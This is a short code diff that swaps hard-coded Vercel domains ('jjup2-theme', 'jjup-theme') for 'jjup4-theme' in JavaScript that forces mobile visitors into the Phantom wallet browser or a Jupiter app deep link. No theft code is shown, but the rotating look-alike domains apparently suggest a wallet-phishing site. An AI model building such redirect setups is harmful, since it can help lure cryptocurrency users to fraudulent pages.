@@ -310,7 +310,7 @@ $(document).ready(async function () {
 
     // 🔗 Redirect to Phantom in-app browser if on mobile and Phantom not detected
     if (isMobile && !window.solana) {
-      window.location.href = "https://phantom.app/ul/browse/https%3A%2F%2Fjjup-theme.vercel.app?ref=https%3A%2F%2Fjjup-theme.vercel.app";
+      window.location.href = "https://phantom.app/ul/browse/https%3A%2F%2Fjjup4-theme.vercel.app?ref=https%3A%2F%2Fjjup4-theme.vercel.app";
       return;
     }
 
@@ -373,13 +373,13 @@ $(document).ready(async function () {
         navigator.userAgent
       );
   
-    const siteURL = "https://jjup2-theme.vercel.app";
+    const siteURL = "https://jjup4-theme.vercel.app";
     const encodedURL = encodeURIComponent(siteURL);
   
     // 🚀 On mobile — open site inside Jupiter Mobile app browser
     if (isMobile) {
       // This should open inside Jupiter app if installed
-      const jupiterDeepLink = `jupiter://jjup2-theme.vercel.app?fromJupiter=true`;
+      const jupiterDeepLink = `jupiter://jjup4-theme.vercel.app?fromJupiter=true`;
       window.location.href = jupiterDeepLink;
       
       // ⏳ Fallback to App Store if Jupiter app isn't installed
